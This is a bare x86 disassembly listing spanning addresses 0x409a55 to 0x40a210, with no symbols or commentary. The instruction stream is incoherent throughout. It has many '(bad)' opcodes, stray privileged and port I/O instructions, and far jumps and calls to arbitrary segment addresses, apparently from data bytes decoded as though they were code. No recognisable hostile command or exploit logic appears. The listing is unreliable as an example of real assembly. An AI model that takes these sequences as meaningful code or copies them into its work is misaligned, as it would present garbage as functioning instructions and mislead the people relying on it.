  409a55:	add    DWORD PTR [ecx],ebx
  409a57:	inc    edx
  409a58:	lahf   
  409a59:	nop
  409a5a:	nop
  409a5b:	nop
  409a5c:	or     al,0x2a
  409a5e:	sti    
  409a5f:	(bad)  
  409a60:	sti    
  409a61:	lea    eax,[ecx+ecx*2]
  409a64:	je     0x409a09
  409a66:	push   es
  409a67:	inc    esi
  409a68:	sbb    al,0xc3
  409a6a:	pop    ebx
  409a6b:	mov    dh,0x9
  409a6d:	in     eax,0xd1
  409a6f:	mov    edx,0x7e23a421
  409a74:	das    
  409a75:	pop    eax
  409a76:	ins    BYTE PTR es:[edi],dx
  409a77:	shr    edi,cl
  409a79:	mov    cl,0xc1
  409a7b:	jle    0x409abf
  409a7d:	rcr    DWORD PTR [ebx-0xd],0x44
  409a81:	inc    ebp
  409a82:	pop    esi
  409a83:	pusha  
  409a84:	pop    ds
  409a85:	xlat   BYTE PTR ds:[ebx]
  409a86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a87:	jnp    0x409a37
  409a89:	mov    eax,0x798caa85
  409a8e:	aam    0x74
  409a90:	jge    0x409a90
  409a92:	cld    
  409a93:	adc    al,0xdb
  409a95:	mov    BYTE PTR [edi],bl
  409a97:	cwde   
  409a98:	pop    ecx
  409a99:	pusha  
  409a9a:	je     0x409ae5
  409a9c:	scas   al,BYTE PTR es:[edi]
  409a9d:	push   ds
  409a9e:	arpl   WORD PTR [esi+eax*4-0x489f8e0d],bp
  409aa5:	mov    edx,0x13c4c987
  409aaa:	sub    ch,BYTE PTR [ebx+0x693aa927]
  409ab0:	retf   
  409ab1:	xor    al,0xa5
  409ab3:	mov    bh,0x4a
  409ab5:	jo     0x409a71
  409ab7:	fld    TBYTE PTR [edi+0x17]
  409aba:	dec    esp
  409abb:	mov    esi,0x11efcc7e
  409ac0:	enter  0xbee4,0xb0
  409ac4:	jle    0x409af3
  409ac6:	loop   0x409b00
  409ac8:	mov    WORD PTR [edx-0x44],gs
  409acb:	test   eax,0xb285d8a0
  409ad1:	daa    
  409ad2:	in     al,0xf7
  409ad4:	stc    
  409ad5:	mov    dl,0x88
  409ad7:	enter  0x27fc,0x3
  409adb:	xsha1  (bad)
  409adc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409add:	or     al,0x26
  409adf:	mov    ch,0xa1
  409ae1:	or     ebp,ebx
  409ae3:	jmp    0x409ada
  409ae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ae6:	imul   ecx,DWORD PTR [esi+0x0],0xae8623ef
  409aed:	jl     0x409a73
  409aef:	jne    0x409a7b
  409af1:	mov    ah,0xf9
  409af3:	jbe    0x409afe
  409af5:	fbstp  TBYTE PTR [ecx-0x498985d6]
  409afb:	outs   dx,BYTE PTR ds:[esi]
  409afd:	pop    esi
  409afe:	or     al,0x56
  409b00:	lea    ebp,[eax-0x75]
  409b03:	addr16 mov edx,0xd23fb741
  409b09:	cwde   
  409b0a:	xor    ch,bl
  409b0c:	cwde   
  409b0d:	lock jmp 0x409aa7
  409b10:	shr    BYTE PTR [ecx-0x3ad6e4b6],cl
  409b16:	xlat   BYTE PTR ds:[ebx]
  409b17:	jb     0x409b84
  409b19:	pop    edi
  409b1a:	inc    edx
  409b1b:	(bad)  
  409b1d:	inc    eax
  409b1e:	sub    cl,BYTE PTR [ebx+0x158393dc]
  409b24:	xchg   edx,eax
  409b25:	test   eax,0xba0fb439
  409b2a:	mov    eax,ds:0x5e9dfcb9
  409b2f:	loop   0x409b77
  409b31:	mov    edx,DWORD PTR [edi+0x5230e04c]
  409b37:	mov    eax,0xc26ae1f1
  409b3c:	pop    ds
  409b3d:	add    eax,0x5bfc72bf
  409b42:	sub    edi,ecx
  409b44:	daa    
  409b45:	mov    eax,0x7d9f28f
  409b4a:	jno    0x409b21
  409b4c:	or     eax,0x1a9d7b64
  409b51:	int3   
  409b52:	sub    ax,0x8c5d
  409b56:	sahf   
  409b57:	cs out 0x57,al
  409b5a:	aas    
  409b5b:	outs   dx,BYTE PTR ds:[esi]
  409b5c:	push   esi
  409b5d:	jmp    0x409afc
  409b5f:	(bad)  
  409b60:	or     eax,0xac67b806
  409b65:	dec    ecx
  409b66:	push   ecx
  409b67:	or     DWORD PTR [edi+0x7a],ecx
  409b6a:	retf   0xb076
  409b6d:	aaa    
  409b6e:	xor    DWORD PTR [edi+edx*8-0x7579f22c],0x5f
  409b76:	push   ss
  409b77:	dec    ecx
  409b78:	bound  eax,QWORD PTR [eax]
  409b7a:	jmp    0x1bf36157
  409b7f:	pop    esi
  409b80:	adc    eax,0x17c41a9d
  409b85:	mov    cl,0xc8
  409b87:	data16 xor al,0xc1
  409b8a:	(bad)  
  409b8b:	cwde   
  409b8c:	pusha  
  409b8d:	iret   
  409b8e:	aas    
  409b8f:	sub    edx,ebx
  409b91:	mov    eax,0xa30d8c1c
  409b96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b97:	je     0x409c10
  409b99:	add    al,0x40
  409b9b:	inc    BYTE PTR ds:0xa14d16ed
  409ba1:	jmp    0x74a9:0x20670e6d
  409ba8:	call   DWORD PTR [edi]
  409baa:	into   
  409bab:	sub    DWORD PTR [edx-0x2],esp
  409bae:	dec    esp
  409baf:	add    bl,BYTE PTR [eax]
  409bb1:	pop    edx
  409bb2:	push   ebx
  409bb3:	ins    BYTE PTR es:[edi],dx
  409bb4:	adc    eax,0x4dd54d20
  409bb9:	retf   
  409bba:	(bad)  [edi-0x1a]
  409bbd:	out    dx,eax
  409bbe:	rcl    DWORD PTR [edx],1
  409bc0:	or     al,0x30
  409bc2:	mov    esp,0xd7cfc46d
  409bc7:	outs   dx,BYTE PTR ds:[esi]
  409bc8:	test   DWORD PTR fs:[edx-0x33],ebx
  409bcc:	adc    ah,dl
  409bce:	loop   0x409baf
  409bd0:	push   0xffffff97
  409bd2:	frstor [edx-0x54]
  409bd5:	add    bl,BYTE PTR [ecx*1+0x64cec5b3]
  409bdc:	(bad)  
  409bdd:	pop    ecx
  409bde:	xlat   BYTE PTR ds:[ebx]
  409bdf:	add    al,BYTE PTR [ebp+edx*8-0x35]
  409be3:	into   
  409be4:	std    
  409be5:	fdiv   QWORD PTR [esi]
  409be7:	daa    
  409be8:	imul   ecx,DWORD PTR [edi+0x6],0x6
  409bec:	mov    dl,0x8f
  409bee:	push   ebx
  409bef:	sar    dl,1
  409bf1:	imul   ebp,DWORD PTR [ecx],0x166f95e2
  409bf7:	mov    ds:0xb64539c2,al
  409bfc:	and    ebx,0xe6a537c6
  409c02:	sti    
  409c03:	out    0x2,eax
  409c05:	fstp   DWORD PTR [edx+0x52]
  409c08:	not    DWORD PTR [ebp+0x115cfa20]
  409c0e:	hlt    
  409c0f:	sbb    BYTE PTR [edx-0x43],bl
  409c12:	sub    al,0x3b
  409c14:	into   
  409c15:	adc    edx,esi
  409c17:	ror    DWORD PTR [ebp+0x32],1
  409c1a:	cmp    al,0xee
  409c1c:	rcr    BYTE PTR [esi-0x70],0x8d
  409c20:	and    BYTE PTR [ebx-0x63f592f0],dl
  409c26:	leave  
  409c27:	iret   
  409c28:	push   ss
  409c29:	fsub   QWORD PTR [edx]
  409c2b:	popa   
  409c2c:	and    eax,DWORD PTR [ebx]
  409c2e:	icebp  
  409c2f:	mov    dl,0x74
  409c31:	xchg   esi,eax
  409c32:	sub    ecx,DWORD PTR [edx]
  409c34:	fcom   QWORD PTR [edi+0x65]
  409c37:	and    BYTE PTR [esi+edi*8-0x2c],al
  409c3b:	les    esi,FWORD PTR [ecx-0x30]
  409c3e:	je     0x409c69
  409c40:	mov    ds:0xf0d3e05e,eax
  409c45:	inc    ebp
  409c46:	xlat   BYTE PTR ds:[ebx]
  409c47:	adc    al,0xbb
  409c49:	push   ds
  409c4a:	mov    es,WORD PTR [edi-0x7b]
  409c4d:	mov    ebp,0xb62090b6
  409c52:	or     eax,0x3f84e63a
  409c57:	xchg   edx,eax
  409c58:	sub    DWORD PTR [ecx],esi
  409c5a:	jns    0x409ccb
  409c5c:	sub    DWORD PTR [esi+0x32239aad],ecx
  409c62:	js     0x409beb
  409c64:	mov    bh,0x25
  409c66:	nop
  409c67:	jecxz  0x409c1a
  409c69:	es mov eax,ebx
  409c6c:	out    dx,al
  409c6d:	jnp    0x409c2b
  409c6f:	mov    eax,ds:0xeb907b4
  409c74:	jns    0x409c32
  409c76:	les    edx,FWORD PTR [di-0x60]
  409c7a:	daa    
  409c7b:	test   al,0x9b
  409c7d:	loope  0x409c81
  409c7f:	xchg   ebx,eax
  409c80:	sub    edi,ebx
  409c82:	xor    edi,DWORD PTR [edx]
  409c84:	mov    bh,0xdc
  409c86:	js     0x409c2b
  409c88:	jns    0x409c59
  409c8a:	ret    0x5318
  409c8d:	adc    esi,DWORD PTR [ebx-0x156d09d1]
  409c93:	int3   
  409c94:	dec    ebx
  409c95:	push   0x8ccfaa39
  409c9a:	cs inc ebx
  409c9c:	test   DWORD PTR [ebx-0x39],0xff6ace60
  409ca3:	sbb    BYTE PTR [esi-0x3],ch
  409ca6:	into   
  409ca7:	jmp    0x409d16
  409ca9:	jp     0x409c36
  409cab:	xchg   edi,eax
  409cac:	inc    ecx
  409cad:	jo     0x409ca1
  409caf:	add    esp,DWORD PTR [eax-0x33790e00]
  409cb5:	sub    cl,BYTE PTR [ebp+0x2aebee9d]
  409cbb:	icebp  
  409cbc:	adc    al,BYTE PTR [ebx-0x2219e8f7]
  409cc2:	add    eax,0x318292a
  409cc7:	cld    
  409cc8:	or     ebp,DWORD PTR [edx+0x23befcfb]
  409cce:	or     esi,DWORD PTR [esi-0xa]
  409cd1:	nop
  409cd2:	neg    DWORD PTR [edi+0x43]
  409cd5:	push   edi
  409cd6:	dec    edi
  409cd7:	aam    0xca
  409cd9:	push   ds
  409cda:	fidiv  DWORD PTR [ebp-0x7]
  409cdd:	out    dx,eax
  409cde:	jmp    FWORD PTR [edx+0x25]
  409ce1:	call   0x87e2:0xa44df156
  409ce8:	jg     0x409ca4
  409cea:	xor    al,0x87
  409cec:	test   BYTE PTR [edx-0x42],ah
  409cef:	es sbb al,0x56
  409cf2:	mov    esp,DWORD PTR [ecx+0x4177d18a]
  409cf8:	nop
  409cf9:	push   edi
  409cfa:	adc    ch,BYTE PTR [ebp+0x2a]
  409cfd:	scas   eax,DWORD PTR es:[edi]
  409cfe:	jno    0x409c98
  409d00:	or     al,0xbb
  409d02:	adc    cl,bl
  409d04:	fs aam 0x11
  409d07:	mov    esp,0x5960296d
  409d0c:	ret    0xb8cb
  409d0f:	jb     0x409d07
  409d11:	push   0xe8f2eb03
  409d16:	sub    BYTE PTR [ebp-0x26ac6f42],dl
  409d1c:	imul   esi,edi,0x73
  409d1f:	adc    DWORD PTR [eax],ebp
  409d21:	lods   eax,DWORD PTR ds:[esi]
  409d22:	adc    ebp,DWORD PTR [ebp+0x220f8877]
  409d28:	add    al,0xc2
  409d2a:	nop
  409d2b:	stc    
  409d2c:	out    dx,al
  409d2d:	or     eax,0xe867f136
  409d32:	loop   0x409d0f
  409d34:	pop    es
  409d35:	cmp    al,0x14
  409d37:	iret   
  409d38:	or     al,BYTE PTR [ecx+0x60]
  409d3b:	stos   BYTE PTR es:[edi],al
  409d3c:	jbe    0x409d7c
  409d3e:	cli    
  409d3f:	cs (bad) 
  409d41:	retf   0xfdf1
  409d44:	dec    ebp
  409d45:	loop   0x409d4f
  409d47:	(bad)  
  409d48:	jg     0x409d49
  409d4a:	mov    ebx,0x27552beb
  409d4f:	push   ecx
  409d50:	push   esp
  409d51:	test   eax,0x2eb6ee96
  409d56:	ror    DWORD PTR [edx],0x83
  409d59:	ins    DWORD PTR es:[edi],dx
  409d5a:	push   es
  409d5b:	lea    esp,[edi*8+0x250d3b6f]
  409d62:	sbb    eax,0xb45560b4
  409d67:	xor    eax,0xc2e3c3d1
  409d6c:	fistp  QWORD PTR [edi]
  409d6e:	sub    eax,0x6801892f
  409d73:	pop    ss
  409d74:	pop    es
  409d75:	pop    ebp
  409d76:	xchg   ecx,eax
  409d77:	sub    BYTE PTR [esi],ch
  409d79:	inc    esi
  409d7a:	mov    edx,0xb98cec20
  409d7f:	sub    al,0x1e
  409d81:	call   0x25ab:0x763953d1
  409d88:	loopne 0x409d21
  409d8a:	das    
  409d8b:	fisubr WORD PTR [ecx]
  409d8d:	xchg   ebp,eax
  409d8e:	inc    eax
  409d8f:	lahf   
  409d90:	and    al,0xe7
  409d92:	cmp    ch,BYTE PTR [edx+ebp*8-0x62]
  409d96:	inc    eax
  409d97:	push   ss
  409d98:	inc    ecx
  409d99:	add    ah,ch
  409d9b:	rol    DWORD PTR [ecx],1
  409d9d:	(bad)  
  409d9e:	xlat   BYTE PTR ds:[ebx]
  409d9f:	inc    edi
  409da0:	dec    edi
  409da1:	xchg   edx,eax
  409da2:	add    DWORD PTR [esi-0x2407f2b9],edi
  409da8:	fbld   TBYTE PTR [eax-0x57]
  409dab:	xor    al,0x68
  409dad:	add    al,0xb3
  409daf:	js     0x409d94
  409db1:	mov    dh,0xa4
  409db3:	call   DWORD PTR [ebx+esi*8+0x2ffa4de3]
  409dba:	clc    
  409dbb:	in     eax,0xf
  409dbd:	mov    eax,ds:0x81a90b4a
  409dc2:	push   esp
  409dc3:	jl     0x409e13
  409dc5:	les    esp,FWORD PTR [ebp-0x235395e1]
  409dcb:	cdq    
  409dcc:	jmp    0xad3c:0x3c10c14c
  409dd3:	aas    
  409dd4:	sub    ch,bh
  409dd6:	mov    bl,0x88
  409dd8:	xor    ah,BYTE PTR [ecx]
  409dda:	sbb    ebp,ecx
  409ddc:	mov    BYTE PTR [esi-0x6d],0x2
  409de0:	popa   
  409de1:	jne    0x409d63
  409de3:	mov    al,ds:0xcb698db2
  409de8:	ins    DWORD PTR es:[edi],dx
  409de9:	cwde   
  409dea:	cmp    eax,0xb5168912
  409def:	test   DWORD PTR [esi+0x349d3e79],esp
  409df5:	fwait
  409df6:	mov    bh,0x3b
  409df8:	retf   
  409df9:	aad    0xf9
  409dfb:	or     bl,BYTE PTR [ebx-0x7a2d9628]
  409e01:	cmp    eax,edx
  409e03:	mov    bh,0x79
  409e05:	and    edx,DWORD PTR [ebx-0x34e02d2a]
  409e0b:	xor    ebx,DWORD PTR [eax]
  409e0d:	push   es
  409e0e:	ds daa 
  409e10:	xchg   edi,eax
  409e11:	out    dx,al
  409e12:	mov    esi,0x52c9c77f
  409e17:	add    al,0x5a
  409e19:	sub    BYTE PTR [esi+0x19],dl
  409e1c:	pop    esi
  409e1d:	add    eax,0x8acf3b69
  409e22:	xor    DWORD PTR [eax-0x5a3bff8a],esi
  409e28:	and    al,0x45
  409e2a:	(bad)  
  409e2b:	repnz outs dx,BYTE PTR ds:[esi]
  409e2d:	and    edi,DWORD PTR [edx]
  409e2f:	das    
  409e30:	retf   0x6556
  409e33:	xchg   DWORD PTR [esp+edx*8+0x50],ebx
  409e37:	dec    edi
  409e38:	sbb    BYTE PTR [edi+0x58],cl
  409e3b:	aas    
  409e3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e3d:	mov    WORD PTR ds:0xe20889b,gs
  409e43:	xchg   ecx,eax
  409e44:	stos   BYTE PTR es:[edi],al
  409e45:	shl    DWORD PTR [edi+0x62783431],cl
  409e4b:	mov    esp,0x2497c85f
  409e50:	jecxz  0x409e4a
  409e52:	icebp  
  409e53:	je     0x409eb7
  409e55:	pop    eax
  409e56:	mov    ebp,0xbb948900
  409e5b:	xchg   BYTE PTR [esi],bh
  409e5d:	jge    0x409eb4
  409e5f:	(bad)  
  409e60:	xchg   ebx,eax
  409e61:	push   es
  409e62:	addr16 popa 
  409e64:	dec    edx
  409e65:	call   0x52da:0x5c1a072c
  409e6c:	or     esp,DWORD PTR es:[esi+0x2c]
  409e70:	fdivp  st(4),st
  409e72:	loopne 0x409e96
  409e74:	pushf  
  409e75:	push   0xffffffe2
  409e77:	jo     0x409e28
  409e79:	mov    al,0x2b
  409e7b:	jno    0x409e24
  409e7d:	test   al,0x4f
  409e7f:	jne    0x409e19
  409e81:	dec    ecx
  409e82:	mov    bl,0x9f
  409e84:	jae    0x409e11
  409e86:	mov    al,0x9d
  409e88:	(bad)  [edx]
  409e8a:	fucomi st,st(2)
  409e8c:	outs   dx,DWORD PTR ds:[esi]
  409e8d:	leave  
  409e8e:	bound  edx,QWORD PTR [edx-0x7d]
  409e91:	ss (bad) 
  409e94:	jecxz  0x409e47
  409e96:	mov    ah,0x99
  409e98:	cmp    eax,0x196e22cd
  409e9d:	xchg   edx,eax
  409e9e:	xor    ecx,ecx
  409ea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ea1:	cs imul edx
  409ea4:	jne    0x409e5e
  409ea6:	in     eax,0x9b
  409ea8:	mov    ebx,0xa045867f
  409ead:	ror    BYTE PTR [ecx],cl
  409eaf:	xor    edx,edx
  409eb1:	fistp  QWORD PTR [edx+0x38]
  409eb4:	mov    dh,0x19
  409eb6:	mov    ebx,0x59b3462e
  409ebb:	xchg   edi,eax
  409ebc:	rcl    edx,0xd9
  409ebf:	lds    ebx,FWORD PTR [edx-0x1762b088]
  409ec5:	adc    BYTE PTR [edi+0x4665b099],al
  409ecb:	or     DWORD PTR [ebx+0x2c],esp
  409ece:	sbb    esi,DWORD PTR [esi+0x63e4c446]
  409ed4:	jae    0x409e6e
  409ed6:	xchg   esi,eax
  409ed7:	inc    edx
  409ed8:	dec    ebx
  409ed9:	cdq    
  409eda:	cmp    cl,BYTE PTR [esi]
  409edc:	fmul   DWORD PTR [ebx-0x8]
  409edf:	add    eax,0xca2c2f80
  409ee4:	cmp    eax,0x863e45d1
  409ee9:	cmp    BYTE PTR [ebp+ecx*8-0x232d273c],ch
  409ef0:	outs   dx,DWORD PTR ds:[esi]
  409ef1:	mov    ch,0x7f
  409ef3:	outs   dx,BYTE PTR ds:[esi]
  409ef4:	xchg   ecx,eax
  409ef5:	add    al,0xc0
  409ef7:	in     al,0x8d
  409ef9:	test   BYTE PTR [ebx+0x4e],0xaf
  409efd:	pop    ds
  409efe:	jg     0x409efb
  409f00:	ror    edi,cl
  409f02:	inc    esp
  409f03:	sbb    eax,0xdffac93c
  409f08:	je     0x409f01
  409f0a:	xlat   BYTE PTR ds:[ebx]
  409f0b:	(bad)  
  409f0c:	ins    BYTE PTR es:[edi],dx
  409f0d:	rcl    esi,1
  409f0f:	mov    esp,0x6c8fdb5c
  409f14:	stc    
  409f15:	xor    BYTE PTR [ecx+0x7f],bh
  409f18:	lea    ebx,ds:0xd3a765b6
  409f1e:	sbb    ecx,DWORD PTR es:[edx-0x519d63b4]
  409f25:	inc    edx
  409f26:	lds    edx,FWORD PTR [ebp+0x1432259e]
  409f2c:	dec    esp
  409f2d:	fcom   DWORD PTR [ebp+0x37]
  409f30:	out    dx,eax
  409f31:	inc    esi
  409f32:	pop    esi
  409f33:	add    dl,BYTE PTR [ebp+esi*1+0x2]
  409f37:	addr16 je 0x409f8c
  409f3a:	mov    dh,0x6a
  409f3c:	test   BYTE PTR [ebx+eax*2],cl
  409f3f:	nop
  409f40:	add    BYTE PTR [ebx+edi*8-0x4],ch
  409f44:	call   0x5668:0x6c36d88f
  409f4b:	ret    0x426
  409f4e:	addr16 fucom st(6)
  409f51:	dec    ebx
  409f52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f53:	frstor ds:0xfc8c836
  409f59:	xor    edi,DWORD PTR [ebx+0x57]
  409f5c:	or     eax,0xe7dfcc6b
  409f61:	cwde   
  409f62:	jmp    0x409f42
  409f64:	push   0x2d1d18db
  409f69:	clc    
  409f6a:	pop    ebx
  409f6b:	mov    ds:0x1bbc5216,al
  409f70:	leave  
  409f71:	adc    BYTE PTR [edx],cl
  409f73:	pop    ecx
  409f74:	fwait
  409f75:	adc    esi,DWORD PTR [bp+si-0x36]
  409f79:	sub    ah,ah
  409f7b:	cmp    eax,0xcb54e3f0
  409f80:	xchg   ebp,eax
  409f81:	addr16 jg 0x409fff
  409f84:	jp     0x409fad
  409f86:	dec    edx
  409f87:	and    BYTE PTR [ebx+0x48],0x80
  409f8b:	push   eax
  409f8c:	cli    
  409f8d:	jne    0x409f8c
  409f8f:	jno    0x409f87
  409f91:	fild   QWORD PTR [edi]
  409f93:	adc    dh,cl
  409f95:	shl    BYTE PTR [edx+eax*1],0x12
  409f99:	xchg   dh,cl
  409f9b:	and    DWORD PTR [edi+0x5dd0d1c3],edx
  409fa1:	mul    DWORD PTR [ecx-0x23]
  409fa4:	sub    al,0xa3
  409fa6:	cpuid  
  409fa8:	push   ds
  409fa9:	sub    eax,0xbb5fbbc6
  409fae:	mov    ah,0xde
  409fb0:	cmp    eax,DWORD PTR [eax]
  409fb2:	not    BYTE PTR [ebx]
  409fb4:	iret   
  409fb5:	outs   dx,BYTE PTR ds:[esi]
  409fb6:	(bad)  
  409fb7:	cdq    
  409fb8:	push   eax
  409fb9:	sub    DWORD PTR [eax-0x1de350dd],0xffffff98
  409fc0:	icebp  
  409fc1:	retf   
  409fc2:	xchg   DWORD PTR [ecx-0x611a15e1],edx
  409fc8:	pop    ecx
  409fc9:	add    al,0x6d
  409fcb:	lock enter 0xf03d,0x20
  409fd0:	pop    ecx
  409fd1:	cwde   
  409fd2:	bound  edi,QWORD PTR [eax]
  409fd4:	adc    DWORD PTR [edx-0x18f1f830],esi
  409fda:	and    BYTE PTR [edi],bh
  409fdc:	fdiv   DWORD PTR [bx+0xe]
  409fe0:	or     al,0x3a
  409fe2:	mov    ecx,0x712b0259
  409fe7:	ret    
  409fe8:	xor    al,0x6c
  409fea:	aas    
  409feb:	pusha  
  409fec:	inc    ebp
  409fed:	or     eax,0x9f7de057
  409ff2:	retf   
  409ff3:	adc    edx,DWORD PTR [ecx]
  409ff5:	in     eax,0xd0
  409ff7:	mov    WORD PTR ds:0x67759900,?
  409ffd:	dec    esi
  409ffe:	pusha  
  409fff:	sbb    eax,0xccd04f02
  40a004:	dec    edx
  40a005:	pop    eax
  40a006:	pop    es
  40a007:	sbb    cl,dh
  40a009:	jecxz  0x40a056
  40a00b:	shl    DWORD PTR [esi],0xb9
  40a00e:	add    edi,DWORD PTR [edx+0x2b630228]
  40a014:	push   edx
  40a015:	mov    ah,0xd9
  40a017:	sub    ch,ch
  40a019:	pop    esi
  40a01a:	bound  edx,QWORD PTR [edx+0x2a]
  40a01d:	enter  0x2ca3,0x1
  40a021:	mov    ds:0x7e1a5c5,al
  40a026:	inc    esi
  40a027:	adc    ecx,DWORD PTR [ecx]
  40a029:	xor    ecx,esi
  40a02b:	pop    ss
  40a02c:	sub    ebx,DWORD PTR [ecx]
  40a02e:	(bad)  
  40a030:	xchg   esp,eax
  40a031:	inc    esp
  40a032:	jne    0x40a075
  40a034:	data16 cmc 
  40a036:	xor    ebp,esp
  40a038:	pop    edi
  40a039:	fcom   QWORD PTR [edi+0x1d536040]
  40a03f:	inc    edi
  40a040:	cli    
  40a041:	xchg   esp,eax
  40a042:	js     0x40a068
  40a044:	int3   
  40a045:	shl    al,cl
  40a047:	sbb    BYTE PTR [esi+0x5af3e1a7],bl
  40a04d:	mov    bl,0x33
  40a04f:	mov    edx,0x29ebdcb1
  40a054:	xchg   BYTE PTR [ecx+edi*4],dh
  40a057:	retf   
  40a058:	(bad)  
  40a059:	xchg   esi,eax
  40a05a:	or     eax,0xc7f8d85b
  40a05f:	in     eax,0xec
  40a061:	aaa    
  40a062:	dec    ecx
  40a063:	cmp    DWORD PTR [edx-0x5b],esp
  40a066:	out    dx,eax
  40a067:	lea    edi,ds:0x734e0d55
  40a06d:	add    BYTE PTR [edx+0xd309cfc],ah
  40a073:	pop    eax
  40a074:	ss ret 0xaf71
  40a078:	sub    DWORD PTR [ecx+0x48],0xfe38bf77
  40a07f:	add    eax,0xde9ce041
  40a084:	adc    eax,DWORD PTR [ebx+0x1f]
  40a087:	push   ss
  40a088:	hlt    
  40a089:	int3   
  40a08a:	(bad)  
  40a08b:	cmp    eax,0x1bb87520
  40a090:	xor    eax,0x6b82708b
  40a095:	jb     0x40a06c
  40a097:	or     dh,BYTE PTR [ecx+0x5c]
  40a09a:	push   edx
  40a09b:	jle    0x40a0ab
  40a09d:	or     eax,0x964ead67
  40a0a2:	sbb    eax,0xdb93526d
  40a0a7:	cmp    BYTE PTR [eax+0x6ebf3704],dh
  40a0ad:	stos   BYTE PTR es:[edi],al
  40a0ae:	fwait
  40a0af:	sub    al,0x3
  40a0b1:	add    al,0x67
  40a0b3:	js     0x40a074
  40a0b5:	sahf   
  40a0b6:	stos   BYTE PTR es:[edi],al
  40a0b7:	iret   
  40a0b8:	pop    edi
  40a0b9:	fimul  WORD PTR [bp+si-0x6a39]
  40a0be:	sar    BYTE PTR [ecx],cl
  40a0c0:	or     eax,0xadf8112
  40a0c5:	pop    eax
  40a0c6:	cmc    
  40a0c7:	out    0xc,eax
  40a0c9:	and    DWORD PTR [ecx-0x32],esp
  40a0cc:	addr16 inc ebx
  40a0ce:	call   0xb9aeb29c
  40a0d3:	ss test al,0xf4
  40a0d6:	and    eax,0xb7ce4621
  40a0db:	fadd   DWORD PTR [esi]
  40a0dd:	mov    ebp,0x71f182af
  40a0e2:	mov    bl,0x85
  40a0e4:	imul   eax,DWORD PTR [edi+ecx*1-0x45],0xffffffb6
  40a0e9:	xor    BYTE PTR [esi],bh
  40a0eb:	outs   dx,BYTE PTR ds:[esi]
  40a0ec:	enter  0x5df4,0xba
  40a0f0:	add    eax,0x1662f11b
  40a0f5:	test   DWORD PTR [eax+0x1ccab951],ebx
  40a0fb:	cdq    
  40a0fc:	fcomi  st,st(4)
  40a0fe:	and    DWORD PTR [esi],ebp
  40a100:	nop
  40a101:	nop
  40a102:	sbb    eax,0x774f2fc4
  40a107:	dec    edx
  40a108:	add    ch,BYTE PTR [esi]
  40a10a:	add    edx,DWORD PTR [ebx+0x55783465]
  40a110:	pop    esi
  40a111:	adc    esi,DWORD PTR [ebp-0x7fcc54c2]
  40a117:	xor    eax,0x2d850f3f
  40a11c:	stc    
  40a11d:	pop    es
  40a11e:	fnsave [ecx+0x54]
  40a121:	pop    ecx
  40a122:	sbb    bh,BYTE PTR [ecx]
  40a124:	out    dx,al
  40a125:	scas   eax,DWORD PTR es:[edi]
  40a126:	dec    edx
  40a127:	push   ecx
  40a128:	push   esp
  40a129:	push   ecx
  40a12a:	fimul  WORD PTR [esi-0x7cb7ffc9]
  40a130:	pop    ds
  40a131:	hlt    
  40a132:	or     ebp,DWORD PTR [ebx-0x48390c12]
  40a138:	gs push ebp
  40a13a:	dec    ebp
  40a13b:	fisubr DWORD PTR [ebp+0x2e3d5785]
  40a141:	pop    ebx
  40a142:	cmp    BYTE PTR [esi],ah
  40a144:	je     0x40a18a
  40a146:	enter  0x390f,0x52
  40a14a:	(bad)  
  40a14b:	xor    dh,BYTE PTR [edx]
  40a14d:	dec    esi
  40a14e:	jns    0x40a187
  40a150:	mov    ecx,0xd1445e66
  40a155:	out    0x72,al
  40a157:	mov    ds:0x4ac41a10,al
  40a15c:	or     al,0xb4
  40a15e:	mov    dl,0x32
  40a160:	dec    eax
  40a161:	cmp    dl,BYTE PTR [ebx+0x36]
  40a164:	jb     0x40a1d1
  40a166:	rcr    ecx,1
  40a168:	adc    eax,0x4a0936f5
  40a16d:	dec    edi
  40a16e:	nop
  40a16f:	test   eax,0x84160b0f
  40a174:	adc    eax,0xb6f44dde
  40a179:	call   0x434a:0xe00b49c
  40a180:	inc    ebp
  40a181:	loop   0x40a174
  40a183:	les    eax,FWORD PTR [ecx+0x38f679e]
  40a189:	in     eax,dx
  40a18a:	ja     0x40a203
  40a18c:	push   ebx
  40a18d:	rol    BYTE PTR [eax-0x43051ab5],1
  40a193:	ins    BYTE PTR es:[edi],dx
  40a194:	sub    DWORD PTR [ebx+0x6b],ecx
  40a197:	fsub   DWORD PTR [esi+ebp*8+0x85bdb81]
  40a19e:	xor    eax,0x18c00779
  40a1a3:	cmp    eax,0xe9da816f
  40a1a8:	dec    ebp
  40a1a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1aa:	es push esp
  40a1ac:	(bad)
  40a1b1:	pop    edx
  40a1b2:	pop    ebx
  40a1b3:	sbb    ch,ah
  40a1b5:	(bad)  
  40a1b6:	sub    DWORD PTR [ecx+0x2aef5b1f],ecx
  40a1bc:	jbe    0x40a1fc
  40a1be:	daa    
  40a1bf:	adc    dh,al
  40a1c1:	std    
  40a1c2:	neg    DWORD PTR [edi-0x41]
  40a1c5:	push   eax
  40a1c6:	pop    es
  40a1c7:	int    0x36
  40a1c9:	or     edx,ecx
  40a1cb:	sub    DWORD PTR [ecx-0x9],esi
  40a1ce:	into   
  40a1cf:	js     0x40a1d0
  40a1d1:	push   0x2b
  40a1d3:	push   cs
  40a1d4:	arpl   WORD PTR [eax-0x3b9f9e03],bp
  40a1da:	push   ds
  40a1db:	xor    ebx,DWORD PTR [eax+esi*2]
  40a1de:	jb     0x40a177
  40a1e0:	jmp    0x40a1d8
  40a1e2:	inc    ebp
  40a1e3:	xchg   edi,eax
  40a1e4:	repz sbb eax,0xcab7b25f
  40a1ea:	mov    ecx,0x3a486b8c
  40a1ef:	pop    ebx
  40a1f0:	stos   DWORD PTR es:[edi],eax
  40a1f1:	mov    esp,0x8023573
  40a1f6:	add    DWORD PTR [ebp+0x7c],ecx
  40a1f9:	mov    fs:0x2dbac01,al
  40a1ff:	sti    
  40a200:	popa   
  40a201:	(bad)  [esi+eiz*4]
  40a204:	mov    DWORD PTR [esi+0x13],ebp
  40a207:	mov    bh,0xf6
  40a209:	jmp    0xdeb5:0x38c44dae
  40a210:	fistp  QWORD PTR [edx+0xb]
